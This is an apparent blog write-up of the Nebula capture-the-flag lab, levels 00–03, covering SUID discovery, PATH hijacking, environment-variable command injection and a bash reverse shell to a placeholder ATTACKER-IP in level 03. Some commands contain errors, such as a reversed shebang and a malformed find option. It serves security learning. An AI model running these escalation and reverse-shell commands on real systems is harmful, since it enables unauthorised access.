# Nebula Exploit Development Challenge Guide

## Welcome to the Nebula Challenge!
---
Before you dive into the Nebula challenge and explore its intricacies, it's highly recommended to read the instruction page carefully. This will provide you with valuable information, guidelines, and tips to make the most out of your Nebula experience.

**[Read the Instructions](https://sec-fortress.github.io/posts/projects/posts/instructions.html)**

## Exploring Nebula Write-ups

You're currently on the Nebula write-up page, where I'll be sharing my journey through various challenges. Here, I've categorized my experiences to help you navigate through the different aspects of the Nebula challenge. Feel free to explore and learn from my solutions and insights.

### Write-up Categories

1. [Local Exploits](#local-exploits)
2. [Privilege Escalation](#privilege-escalation)

Let's dive into the fascinating world of Nebula and uncover the vulnerabilities and solutions that lie ahead!

---

## LEVEL 00

Our First step is to import the ISO file in your Favorite VM Player and SSH into it, Make sure to choose the first option here :

![](https://i.imgur.com/6YsmyRm.png)

Login with `nebula` as username and `nebula` as password

![](https://i.imgur.com/Hzkj8bH.png)

Great, Now let SSH to **LEVEL 00** , do `ifconfig` on nebula and do `ssh level00@<ip-address>`

![](https://i.imgur.com/CL41c5F.png)

![](https://i.imgur.com/nOjD6Z2.png)

> **Objective :**  Find a Set User ID program that will run as the “flag00” account

Definitely we need the Find command to do this , we can use this syntax

```shell
find / -type f -perm -u=flag00 2>/dev/null
```

![](https://i.imgur.com/aOl30E6.png)

We can see that we have alot of SUID programs here , but the first one looks interesting, since we are looking for something related to "flag00" , which after running it leaves us with a message

![](https://i.imgur.com/1s4ac6d.png)

## LEVEL 01

Exit the previous session and login as `level01` both password and username

![](https://i.imgur.com/FSFcma3.png)

> **Objective :** There is vulnerability in a program that allows arbitrary programs to be executed, can you find it? (Refer to the instructions page to know more)

First of all we would `cd` to  **/home/flag01** since we where asked to do so and as we can see we have a "flag01" file with the SUID bit set and executable permissions

![](https://i.imgur.com/t7Bzj2s.png)

Viewing the `source-code` we can see that we have a line that allows us to run system commands :

```c
  system("/usr/bin/env echo and now what?");
```

What we can do here is either the `&&` operator or `;` followed by any other command we wish to run, something like `./flag01; /bin/bash` or `./flag01 && /bin/bash`

![](https://i.imgur.com/XxuYWZT.png)

Definitely, we did not escalate privileges as `flag01`, Since the command `/usr/bin/env` is been used to validate PATH in the executable and then the binary `echo` is ran, we can definitely use this binary to get "flag01" by creating a malicious `echo` file and then adding the location of this malicious file to our PATH Environment.

- Change Directory to /tmp since it is a world writeable folder - `cd /tmp`
- Then do open up nano saving the filename as **echo** - `nano echo`
- Add these lines to the file

```shell
!#/bin/bash

/bin/bash -p
```

- Now save it and grant it executable permissions - `chmod +x echo`

![](https://i.imgur.com/lwLyqCO.png)

- Now add /tmp to our path environment with the command

```shell
export PATH=/tmp:$PATH
```

![](https://i.imgur.com/6ArgPMC.png)

Sorry i did it twice here, you can run the command ones and we are good, Now go back to our **/home/flag01** and run the executable there again, you should be user `flag01`

![](https://i.imgur.com/JIZ9P1S.png)

## LEVEL 02

As usual we are given a C program for this too, but the vulnerable code snippet is these

```c
asprintf(&buffer, "/bin/echo %s is cool", getenv("USER"));
  printf("about to call system(\"%s\")\n", buffer);
```

this program is typically the same as the other one but with more features, this program is going to run the `/bin/echo` binary and print out the current user just like the `whoami` command, but this time it is the current user setup in the USER Environment Variable

![](https://i.imgur.com/5C7XL7w.png)

We can alter this by providing our own USER like the image below, what we did is use the `&&` operator to specify that if the first condition is true which is the `USER="sec-fortress"` then execute the second one which is `./flag02` 

![](https://i.imgur.com/fvUFakt.png)

Now we need a way to run `/bin/bash -p` , we can do this using the `#` and `;` operator whereas the hashtag comment out everything after that command in this case _is cool_ , You should obtain user **flag02** if we did it right

![](https://i.imgur.com/0MZfA1Z.png)

## LEVEL 03

We are giving a folder and an executable in the **/home/flag03** folder

![](https://i.imgur.com/N5Eil9Q.png)

In which the folder `writeable.d` has nothing inside but the `writeable.sh` file has some kind of bash script that looks for a file in the `writeable.d` directory named `*` and then run this `*` file in debug mode with `bash -x`, after the file name `*` is ran, it automatically deletes it

![](https://i.imgur.com/cQX65AY.png)

But as a **Penetration Tester** we know that before the script deletes, we would have gotten what we want, How ??

- We start by starting up a Netcat listener on port 4444 on our attacker machine - `nc -lvnp 4444`
- Then creating a file called `*` in the **writeable.d** directory - `touch *`

![](https://i.imgur.com/7dnhYjV.png)

- Then add these payload to get a reverse shell as user **flag03** into the `*` file, make sure to change ATTACKER-IP to a valid IP address:

```shell
/bin/bash -i >& /dev/tcp/ATTACKER-IP/4444 0>&1
```

- Now grant the `*` file executable permissions and wait for the Moment of doom 😆

![](https://i.imgur.com/xsf3Ojy.png)

---

Remember, to get started, **[read the instructions](https://sec-fortress.github.io/posts/projects/posts/instructions.html)** to ensure you're well-prepared for the Nebula challenge. Happy exploring and learning!

# Thank You for Joining the Nebula Challenge Journey!

As I wrap up this series of Nebula exploit development challenge write-ups, I want to extend my heartfelt gratitude to each and every one of you who embarked on this journey with me. Your curiosity, dedication, and passion for cybersecurity are truly inspiring.

Exploring the intricacies of Linux vulnerabilities and exploit development through Nebula has been an incredible experience. It's through challenges like these that we continue to learn, grow, and strengthen our skills in the ever-evolving landscape of cybersecurity.

I hope that my write-ups have provided insights, strategies, and a deeper understanding of the fascinating world of security exploits. Remember, these write-ups are just a snapshot of what's possible, and I encourage you to explore, experiment, and take your learning even further.

Thank you for your engagement, your feedback, and your enthusiasm. The journey doesn't end here—there's always more to discover, more to learn, and more challenges to conquer.

As you move forward in your own cybersecurity endeavors, may you find success, excitement, and a sense of accomplishment in every step you take. Keep pushing boundaries, keep learning, and keep making the digital world a safer place.

Stay curious, stay determined, and keep challenging the status quo.

With sincere gratitude,
[Sec-Fortress]

